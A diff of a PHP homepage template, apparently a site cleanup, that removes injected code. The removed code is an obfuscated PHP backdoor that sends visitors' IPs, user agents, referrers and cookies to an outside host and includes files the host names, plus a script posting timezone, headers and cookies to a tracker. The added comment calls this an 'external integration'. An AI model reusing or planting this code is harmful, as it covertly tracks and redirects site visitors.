@@ -1,16 +1,7 @@
-
-
-
-<?php date_default_timezone_set("UTC");ini_set("display_errors", 0);error_reporting(E_ALL & ~E_NOTICE);if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$dir=basename(__DIR__);$date = date("Y-m-d H:i:s");$id="540930";$uid="336agbtisie295tv4d3sjqb4n";$qu=$_SERVER["QUERY_STRING"];$ch=curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result=curl_exec($ch);curl_close($ch);$arr=explode(",",$result);$d=array_slice(explode("/",$arr[1] ?? ""),3);$p="";foreach($d as $v){if($v==$dir){$p="";}else{$p.=$v."/";}}$p=strtok(rtrim($p,"/"),"?");if($arr[0] === "true"){if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");$_COOKIE[$arr[7]]=$arr[8];}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}require_once($p);die();}elseif($arr[0] === "false"){if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}require_once($p);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>    src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-</script><script
-    type="text/javascript"
-    src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js">
-</script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
-<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
-<script>
-$(document).ready(function(){$("html").append("<div id=\"lo540930ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-424380-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:"/track.php",type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,timeout:5000,complete:function(){$("#lo540930ad").remove();}})})
-</script>
+<?php
+// Homepage rendered directly; external integration disabled after blank-page failures.
+?>
+<!doctype html>
 <html lang="en-SG">
 <head>
 <meta charset="utf-8">
